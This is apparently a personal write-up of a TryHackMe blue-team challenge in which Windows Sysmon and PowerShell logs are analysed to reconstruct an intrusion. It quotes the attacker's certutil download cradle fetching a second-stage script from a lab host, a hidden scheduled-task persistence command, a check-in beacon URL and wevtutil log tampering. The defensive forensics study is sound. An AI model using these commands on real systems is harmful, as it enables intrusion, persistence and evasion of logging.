# Handbook for the Recently Compromised (TryHackMe, Downtime Challenge 04)

- **Event/module:** Strange & Unusual Activity ("Downtime" / ShowDowntime) blue-team CTF, 22 to 26 Oct 2026.
  Mission 04 of 8 (first of 5 **Challenges**). Windows log-analysis / EVTX forensics. Difficulty: Easy.
- **Date:** 2026-10-23.
- **Status:** SOLVED. All 5 answers correct; room completed, +1 Tombstone raffle ticket (+90 team points).
- **Lab:** in-browser Ubuntu analysis desktop at `<ip>` (SSH 22 + WebSockify VNC on 80; no RDP/SMB).
  Evidence in `~/Desktop/artifacts`: `Microsoft-Windows-Sysmon%4Operational.evtx` +
  `PowerShell-Operational.evtx`. Worked **headless from the lab Terminal** with `evtx_dump` + `grep` + a
  `python3` decode (no Event Viewer GUI).

## Reconstructed attack chain (host THM-JCOLLINS, user `j.collins`)

1. **Initial access (T1218.005 Mshta):** user opened the email attachment
   `C:\Users\j.collins\Downloads\pipeline-check.hta`, executed by **`mshta.exe`**.
2. **Download cradle (LOLBin, T1105):** the HTA spawned hidden PowerShell that ran
   `& ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1`
   - the **`certu*.exe` wildcard resolved to `certutil.exe`**, which downloaded the second stage.
3. **Execution:** `powershell -ep bypass -f $env:TEMP\pipeline-sync.ps1`.
4. **Persistence (T1053.005 Scheduled Task):**
   `schtasks /create /tn StudioPipelineSync /tr "powershell -nop -w hidden -f C:\Users\j.collins\AppData\Roaming\PipelineSync\pipeline-sync.ps1" /sc onlogon /rl highest /f`.
5. **Extras from the script block:** heavy **string-concatenation obfuscation** (T1027), a check-in beacon to
   `http://pipeline-cdn.thm:8088/checkin`, log tampering via `wevtutil epl ... C:\c2serve\...Sysmon...evtx`,
   and the flag written to `%TEMP%\PipelineSync\.sync-cache` (base64, decoded in-script).

## Answers

| # | Question | Answer |
|---|---|---|
| 1 | Trusted utility that downloaded stage 2 (wildcard-obscured) | *(find it yourself)* |
| 2 | Full URL of the second-stage script | *(find it yourself)* |
| 3 | Sub-technique: scripting host that ran the attachment (mshta / .hta) | *(find it yourself)* |
| 4 | Sub-technique: persistence mechanism (scheduled task) | *(find it yourself)* |
| 5 | Flag | `THM{…}` |

## Method (headless, from the lab Terminal)

```bash
cd ~/Desktop/artifacts
evtx_dump -o jsonl Microsoft-Windows-Sysmon%4Operational.evtx > /tmp/s.jsonl
# URLs + key command lines (Image/CommandLine pulled from Sysmon EventID 1)
grep -io 'https\?://[^"\ ]*' /tmp/s.jsonl | sort -u
grep -i certutil /tmp/s.jsonl | grep -o '"CommandLine":"[^}]*' | sort -u   # also mshta, schtasks
# Flag lived in the PowerShell 4104 script block, as a split base64 blob
evtx_dump -o jsonl PowerShell-Operational.evtx > /tmp/ps.jsonl
python3 -c "import base64;print(base64.b64decode('*(find it yourself)*'))"
```

## Lessons learned

- **Wildcard LOLBin obfuscation hides the name, not the behaviour.** The caller used
  `(gci C:\Windows\System32\certu*.exe)[0].FullName` so the literal string "certutil" never appears in the
  parent command. Pivot on the **resolved Sysmon `Image`** (and on the `http://` URL) rather than the tool
  name, or you miss it. `certutil -urlcache -f <url> <out>` is the classic downloader tell.
- **`mshta.exe` running a `.hta` = T1218.005**, not a wscript/cscript answer. When the question says "scripting
  host," confirm *which* host actually spawned the chain in Sysmon before mapping ATT&CK.
- **Sysmon `ParentImage` / `ParentCommandLine` is the Rosetta Stone.** One EventID 1 record for `certutil`
  carried the whole story: parent = hidden PowerShell with the wildcard cradle, grandparent = mshta + the HTA
  path. Read the parent fields, not just the process.
- **Split/concatenated base64 defeats naive regex.** The flag blob was
  `('<b64-chunk>'+'<b64-chunk>'+'<b64-chunk>'+...)` so `grep THM{` and a single-token base64 regex both found nothing. Extract
  the **script block text** and let the script's own logic reassemble it, then decode.
- **`evtx_dump -o jsonl | grep` is a fast, GUI-free EVTX workflow** when you have a Linux analysis box and no
  Windows Event Viewer. Dump once, grep many.

## Related

- [[downtime-event]] - event tracker (this is Challenge 04 of 8).
- [[repossessed]] / [[quiet-as-the-grave]] / [[deadmen-tell-no-logs]] - the SOC sim, threat hunt and tabletop
  of the same event. Note the actor here (`pipeline-cdn.thm:8088`, `StudioPipelineSync`) mirrors Pinstripe
  Moth's playbook: LOLBin download cradle + scheduled-task persistence against TryHatMe Studios.
- [[tryhackme-learning-buddy]] / [[ctf-workspace-dir]].
